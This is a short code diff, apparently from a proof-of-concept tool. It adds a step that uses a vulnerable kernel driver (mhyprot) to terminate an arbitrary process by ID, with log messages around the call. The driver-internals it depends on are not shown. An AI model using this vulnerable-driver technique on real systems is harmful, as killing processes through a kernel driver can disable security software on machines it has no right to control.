@@ -119,7 +119,18 @@ namespace sup
 		}
 		else
 		{
-			logger::log("[!] enum threads test failure\n");
+			logger::log("[!] enum threads test failure\n\n");
+		}
+
+		logger::log("\n[>] terminating process %d using vulnerable driver...\n", process_id);
+
+		if (mhyprot::driver_impl::terminate_process(process_id))
+		{
+			logger::log("[+] terminated!\n\n");
+		}
+		else
+		{
+			logger::log("[!] failed to terminate.\n\n");
 		}
 
 		logger::log("[<] performed\n");
